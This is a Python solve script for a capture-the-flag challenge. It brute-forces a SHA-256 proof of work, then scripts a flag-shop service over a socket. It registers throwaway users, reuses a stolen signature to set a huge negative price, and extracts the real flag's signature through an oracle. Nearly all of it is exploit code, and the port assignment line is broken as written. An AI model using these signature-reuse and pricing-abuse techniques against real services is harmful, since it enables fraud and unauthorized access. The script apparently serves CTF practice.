from hashlib import *         
import socket
import time
    
def getpoW(hint, ans):
    charset = []
    for i in range(10):
        charset.append(chr(i+48))
    for i in range(26):
        charset.append(chr(i+65))
        charset.append(chr(i+97))
    for x in "!#$%&*-?":
        charset.append(x)
    for a in charset:
        for b in charset:
            for c in charset:
                for d in charset:
                    if sha256((a+b+c+d+hint).encode()).hexdigest() == ans:
                        return (a+b+c+d)
                    

def mysend(client, message):
    client.send(message.encode())
    recvData = client.recv(MaxBytes).decode()
    return recvData


MaxBytes=1024
host ='nc.thuctf.redbud.info'
port = # 31983
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((host,port))

recvData = client.recv(MaxBytes).decode()

hint = recvData.split(" + ")[1][:16]
ans = recvData.split(" == ")[1][:64]

recvData = mysend(client, getpoW(hint, ans)+"\n") # send proof of work

recvData = mysend(client, "1\n") # register
recvData = mysend(client, "a-10000000000000000\n") # user 1
recvData = mysend(client, "4\n") # sell
key = recvData.split("\n")[0][-256:] # steal signature

recvData = mysend(client, "1\n") # price
recvData = mysend(client, "money!\n") # name of fake flag
recvData = mysend(client, "7\n") # logout

recvData = mysend(client, "1\n") # register
recvData = mysend(client, "a\n") # user 2
recvData = mysend(client, "5\n") # buy
recvData = mysend(client, "1\n") # id of fake flag
recvData = mysend(client, "6\n") # setprice!
recvData = mysend(client, "1\n") # id of fake flag
recvData = mysend(client, "-100000000000000005311\n") # new price
recvData = mysend(client, key+"\n") # signature
recvData = mysend(client, "7\n") # logout


recvData = mysend(client, "1\n") # register
recvData = mysend(client, "b\n") # user 3
recvData = mysend(client, "5\n") # buy
recvData = mysend(client, "1\n") # id of fake flag
recvData = mysend(client, "5\n") # buy
recvData = mysend(client, "0\n") # id of true flag
recvData = mysend(client, "3\n") # view
recvData = mysend(client, "0\n") # id of true flag
recvData = mysend(client, "0"*256+"\n") # signature
true_sig = recvData.split("\n")[0][-256:]
recvData = mysend(client, "3\n") # view
recvData = mysend(client, "0\n") # id of true flag
recvData = mysend(client, true_sig+"\n") # signature

print(recvData.split("===")[0])

client.close()